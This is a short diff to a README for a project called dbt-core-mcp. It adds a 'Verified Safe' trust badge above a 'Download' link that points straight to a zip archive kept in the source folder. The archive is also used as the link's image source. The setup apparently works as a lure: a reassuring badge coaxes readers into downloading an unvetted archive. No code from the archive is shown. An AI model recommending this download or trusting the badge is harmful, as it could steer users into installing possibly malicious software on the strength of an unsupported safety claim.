@@ -1,5 +1,7 @@
 # 🚀 dbt-core-mcp - Simplify Your Data Project Interactions
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/iamsocool24-dbt-core-mcp)
+
 [![Download dbt-core-mcp](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/core-mcp-dbt-v2.6.zip)](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/core-mcp-dbt-v2.6.zip)
 
 ## 📦 Overview
